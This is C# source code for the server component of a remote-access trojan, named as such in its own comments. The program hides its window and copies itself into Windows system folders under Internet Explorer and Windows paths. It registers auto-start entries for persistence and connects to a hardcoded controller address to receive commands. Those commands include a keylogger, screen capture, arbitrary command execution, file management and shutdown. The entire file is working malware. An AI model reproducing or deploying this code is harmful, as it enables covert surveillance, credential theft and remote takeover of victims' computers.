using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace ServerMain
{
    public partial class ServerMain : Form
    {
        public ServerMain()
        {
            InitializeComponent();
        }

        // FUNCTION DECLARATION
        [DllImport("iphlpapi.dll", CharSet = CharSet.Auto)]
        public static extern int GetBestInterface(UInt32 DestAddr, out UInt32 BestIfIndex);

        // GLOBAL VARIABLES
        public static IPAddress[] ipClient;
        public static IPAddress[] ipServer;
        public static IPEndPoint epClient, epServer;
        public static Socket socketAccept, socketConnect, socketListen;
        public static bool connection = false, partialconnection = false, connectionfailure = false;
        public static byte[] commandNo = new byte[1];
        public static Thread kernelThread;
        public static string processName;
        public static string defaultLocation, defaultLocation1, defaultLocation2;
        public static KeyLogger keyLogInstance = new KeyLogger();

        private void ServerMain_Load(object sender, EventArgs e)
        {
            // GET PROCESS NAME
            processName = Assembly.GetExecutingAssembly().Location;
            processName = processName.Substring(processName.LastIndexOf('\\') + 1);
            processName = processName.Substring(0, processName.LastIndexOf('.'));
            
            // CURRENT LOCATION CHECK
            defaultLocation = Environment.SystemDirectory.Substring(0, 1).ToString() + ":\\Program Files\\Internet Explorer";
            defaultLocation1 = Environment.SystemDirectory.Substring(0, 1).ToString() + ":\\Windows";
            defaultLocation2 = Environment.SystemDirectory.Substring(0, 1).ToString() + ":\\Windows\\System";
            
            // CHECK FOR OTHER INSTANCES
            if (!File.Exists(defaultLocation2 + "\\" + processName + ".exe"))
            {
                // CREATE 1ST BACKUP
                try
                {
                    File.Copy(Assembly.GetExecutingAssembly().Location, defaultLocation2 + "\\" + processName + ".exe");
                }
                catch (Exception) { }
            }
            if (!File.Exists(defaultLocation1 + "\\" + processName + ".exe"))
            {
                // CREATE 2ND BACKUP
                try
                {
                    File.Copy(Assembly.GetExecutingAssembly().Location, defaultLocation1 + "\\" + processName + ".exe");
                }
                catch (Exception) { }
            }
            if (string.Compare(defaultLocation + "\\" + processName + ".exe", Assembly.GetExecutingAssembly().Location) != 0)
            {
                if (!File.Exists(defaultLocation + "\\" + processName + ".exe"))
                {
                    // COPY TO NEW LOCATION
                    try
                    {
                        File.Copy(Assembly.GetExecutingAssembly().Location, defaultLocation + "\\" + processName + ".exe");
                        Process.Start(defaultLocation + "\\" + processName + ".exe");
                    }
                    catch (Exception) { }
                    this.Close();
                }
                else
                {
                    this.Close();
                }
            }

            // AUTO-START CHECK
            if (!AutoStart.IsAutoStartEnabled(processName + "2", defaultLocation2 + "\\" + processName + ".exe"))
                AutoStart.SetAutoStart(processName + "2", defaultLocation2 + "\\" + processName + ".exe");
            if (!AutoStart.IsAutoStartEnabled(processName + "1", defaultLocation1 + "\\" + processName + ".exe"))
                AutoStart.SetAutoStart(processName + "1", defaultLocation1 + "\\" + processName + ".exe");
            if (!AutoStart.IsAutoStartEnabled(processName, defaultLocation + "\\" + processName + ".exe"))
                AutoStart.SetAutoStart(processName, defaultLocation + "\\" + processName + ".exe");
        }

        public void kernel()
        {
            connectionVariablesInitialize();
            // CHECK FOR CONNECTION VARIABLES INITIALIZATION FAILURE
            if (connectionfailure == true)
                trojanStarter();
            // INITIATE CONNECTION
            Thread connect = new Thread(connectionInitiation);
            Thread listen = new Thread(connectionListen);
            connect.Start();
            listen.Start();
            // START SERVER FUNCTIONALITIES
            while (true)
            {
                if (connection == true && connectionfailure == false)
                {
                    commandMonitor();
                    switch (commandNo[0])
                    {
                        case 10:
                            // FILE MANAGER
                            FileManager.fileManagerKernel();
                            break;
                        case 20:
                            // VIEW PROCESSES
                            ProcessManager.getProcesses();
                            break;
                        case 21:
                            // KILL PROCESS
                            ProcessManager.killProcess();
                            break;
                        case 30:
                            // SYSTEM LOGOFF
                            SystemControls.logOff();
                            break;
                        case 31:
                            // SYSTEM POWEROFF
                            SystemControls.powerOff();
                            break;
                        case 32:
                            // SYSTEM RESTART
                            SystemControls.reStart();
                            break;
                        case 40:
                            // AUDIO PLAYER
                            PlayAudio.audioPlayer();
                            break;
                        case 41:
                            // CD EJECT
                            CDEject.ejectCD();
                            break;
                        case 42:
                            // KILL EXPLORER
                            try
                            {
                                Process[] explorer = Process.GetProcessesByName("explorer");
                                foreach (Process p in explorer)
                                {
                                    if (p.MainModule.FileName != defaultLocation + "\\" + processName + ".exe")
                                    {
                                        p.Kill();
                                        break;
                                    }
                                }
                            }
                            catch (Exception) { }
                            break;
                        case 50:
                            // START KEYLOGGER
                            keyLogInstance.keylogStart();
                            break;
                        case 51:
                            // SNAPSHOT GRABBER
                            SnapshotGrabber.captureScreen();
                            break;
                        case 52:
                            // SYSTEM INFORMATION
                            SystemInfo.sysInfo();
                            break;
                        case 53:
                            // STOP KEYLOGGER
                            keyLogInstance.keylogStop();
                            keyLogInstance.flushKeyBuffer();
                            break;
                        case 54:
                            // FLUSH KEY BUFFER
                            keyLogInstance.flushKeyBuffer();
                            break;
                        case 55:
                            // CLOSE KEYLOGGER
                            keyLogInstance.keylogStop();
                            keyLogInstance.KeyBuffer = "";
                            break;
                        case 56:
                            // EXECUTE COMMANDS AT COMMAND PROMPT
                            CmdExecution.executeCmd();
                            break;
                        case 60:
                            // CLOSE TROJAN
                            Process[] server = Process.GetProcessesByName(processName);
                            foreach (Process p in server)
                            {
                                if (p.MainModule.FileName == defaultLocation + "\\" + processName + ".exe")
                                    p.Kill();
                            }
                            break;
                        case 61:
                            // KILL TROJAN
                            AutoStart.UnSetAutoStart(processName);
                            AutoStart.UnSetAutoStart(processName + "1");
                            AutoStart.UnSetAutoStart(processName + "2");
                            AutoStart.MoveFileEx(defaultLocation + "\\" + processName, null, AutoStart.MoveFileFlags.MOVEFILE_DELAY_UNTIL_REBOOT);
                            AutoStart.MoveFileEx(defaultLocation1 + "\\" + processName, null, AutoStart.MoveFileFlags.MOVEFILE_DELAY_UNTIL_REBOOT);
                            AutoStart.MoveFileEx(defaultLocation2 + "\\" + processName, null, AutoStart.MoveFileFlags.MOVEFILE_DELAY_UNTIL_REBOOT);
                            Process[] server1 = Process.GetProcessesByName(processName);
                            foreach (Process p in server1)
                            {
                                if (p.MainModule.FileName == defaultLocation + "\\" + processName + ".exe")
                                    p.Kill();
                            }
                            break;
                        default:
                            connection = false;
                            break;
                    }
                }
                else if ((connection == false && connect.IsAlive == false && listen.IsAlive == false) || connectionfailure == true)
                    trojanStarter(); // RESTART TROJAN
            }
        }
        
        public static void connectionVariablesInitialize()
        {
            try
            {
                string clientip = "192.168.1.2";
                string serverip = "192.168.1.1";
                ipClient = Dns.GetHostAddresses(clientip);

                //comment it to remove auto ip
                byte[] clientipbyte = IPAddress.Parse(clientip).GetAddressBytes();
                UInt32 ipaddr = BitConverter.ToUInt32(clientipbyte, 0);
                UInt32 interfaceindex = 0;
                GetBestInterface(ipaddr, out interfaceindex);
                NetworkInterface[] niadap = NetworkInterface.GetAllNetworkInterfaces();
                foreach (NetworkInterface ni in niadap)
                {
                    try
                    {
                        if (ni.GetIPProperties().GetIPv4Properties().Index == interfaceindex)
                        {
                            serverip = ni.GetIPProperties().UnicastAddresses[1].Address.ToString();
                            break;
                        }
                    }
                    catch (Exception) { }
                }



                ipServer = Dns.GetHostAddresses(serverip);
                epClient = new IPEndPoint(ipClient[0], 6666);
                epServer = new IPEndPoint(ipServer[0], 6667);
                socketConnect = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socketListen = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                commandNo[0] = 0;
            }
            catch (Exception)
            {
                connectionfailure = true;
            }
        }

        public static void connectionInitiation()
        {
            while (!socketConnect.Connected)
            {
                try
                {
                    socketConnect.Connect(epClient);
                }
                catch (Exception) { }
            }
            if (!partialconnection)
                partialconnection = true;
            else
                connection = true;
        }

        public static void connectionListen()
        {
            socketListen.Bind(epServer);
            socketListen.Listen(1);
            socketAccept = socketListen.Accept();
            if (!partialconnection)
                partialconnection = true;
            else
                connection = true;
        }

        public static void commandMonitor()
        {
            try
            {
                while (socketAccept.Receive(commandNo) == 0) ;
            }
            catch (Exception) 
            {
                connection = false;
            }
        }

        private void ServerMain_Shown(object sender, EventArgs e)
        {
            // HIDE TROJAN
            this.Visible = false;
            // START KERNEL THREAD
            kernelThread = new Thread(kernel);
            kernelThread.Start();
        }

        public void trojanStarter()
        {
            Process[] server = Process.GetProcessesByName(processName);
            Process.Start(Assembly.GetExecutingAssembly().Location);
            foreach (Process p in server)
            {
                if (p.MainModule.FileName == defaultLocation + "\\" + processName + ".exe")
                    p.Kill();
            }
        }
    }
}
